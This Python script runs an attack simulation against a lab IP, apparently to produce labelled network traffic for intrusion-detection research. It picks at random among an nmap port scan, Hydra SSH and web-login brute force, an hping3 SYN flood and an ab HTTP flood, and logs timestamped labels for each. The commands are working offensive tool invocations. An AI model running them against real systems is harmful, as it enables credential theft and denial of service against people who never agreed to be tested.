#!/usr/bin/env python3
import subprocess
import random
import time
import sys

TARGET = "10.0.1.2"
USER = "testuser"

# Fixed: small wordlist so brute force doesn't run for hours
# Create this file with: seq 1 500 | xargs -I{} echo "password{}" > /tmp/mini_wordlist.txt
WORDLIST = "/tmp/mini_wordlist.txt"

LABEL_FILE = "labels.log"

# ------------------ LABEL LOGGER ------------------
# Fixed: log_event was defined but never called in the original attack functions

def log_event(label):
    ts = time.time()
    with open(LABEL_FILE, "a") as f:
        f.write(f"{ts},{label}\n")
    print(f"[LABEL] {label} @ {ts:.2f}")

# ------------------ ATTACK FUNCTIONS ------------------

def port_scan():
    log_event("ATTACK_PORT_SCAN_START")
    print("\n[ATTACK] Port Scan (Nmap)")
    subprocess.run([
        "sudo", "nmap",
        "-sS",
        "-p-",
        "-T4",
        TARGET
    ])
    log_event("ATTACK_PORT_SCAN_END")

def brute_force_ssh():
    log_event("ATTACK_SSH_BRUTE_START")
    print("\n[ATTACK] SSH Brute Force (Hydra)")
    # Fixed: added timeout so this cannot hang forever
    # Fixed: using small wordlist instead of rockyou.txt
    subprocess.run([
        "hydra",
        "-l", USER,
        "-P", WORDLIST,
        f"ssh://{TARGET}",
        "-t", "4",
        "-w", "3"       # 3 second timeout per attempt
    ], timeout=60)      # hard cap: bail after 60 seconds total
    log_event("ATTACK_SSH_BRUTE_END")

def dos_syn():
    log_event("ATTACK_SYN_FLOOD_START")
    print("\n[ATTACK] SYN Flood (hping3)")
    process = subprocess.Popen([
        "sudo", "hping3",
        "-S",
        "--flood",
        "-p", "80",
        TARGET
    ])
    time.sleep(10)
    process.terminate()
    process.wait()  # Fixed: wait for process to fully clean up
    log_event("ATTACK_SYN_FLOOD_END")

def dos_http():
    log_event("ATTACK_HTTP_FLOOD_START")
    print("\n[ATTACK] HTTP Flood (ab)")
    subprocess.run([
        "ab",
        "-n", "1000",
        "-c", "50",
        f"http://{TARGET}/"
    ])
    log_event("ATTACK_HTTP_FLOOD_END")

def web_login_bruteforce():
    log_event("ATTACK_WEB_BRUTE_START")
    print("\n[ATTACK] Web Login Brute Force (Hydra HTTP)")
    # Fixed: using small wordlist + timeout
    subprocess.run([
        "hydra",
        "-l", USER,
        "-P", WORDLIST,
        f"{TARGET}",
        "http-post-form",
        "/login.php:username=^USER^&password=^PASS^:F=incorrect"
    ], timeout=60)
    log_event("ATTACK_WEB_BRUTE_END")

ATTACKS = [
    port_scan,
    brute_force_ssh,
    dos_syn,
    dos_http,
    web_login_bruteforce
]

# ------------------ MAIN ------------------

def main():
    print(f"[+] Starting attack simulation on {TARGET}")
    print("[+] Press Ctrl+C to stop\n")

    # Clear previous labels
    open(LABEL_FILE, "w").close()

    try:
        while True:
            attack = random.choice(ATTACKS)

            try:
                attack()
            except subprocess.TimeoutExpired:
                print("[!] Attack timed out, moving on")
            except Exception as e:
                print(f"[!] Attack error: {e}")

            # Fixed: longer cooldown so collector captures clean benign
            # windows between attacks — short cooldown blurs labels
            cooldown = random.randint(2, 5)
            print(f"\n[+] Cooling down for {cooldown}s...\n")
            time.sleep(cooldown)

    except KeyboardInterrupt:
        print("\n[-] Attack simulation stopped.")
        sys.exit(0)

if __name__ == "__main__":
    main()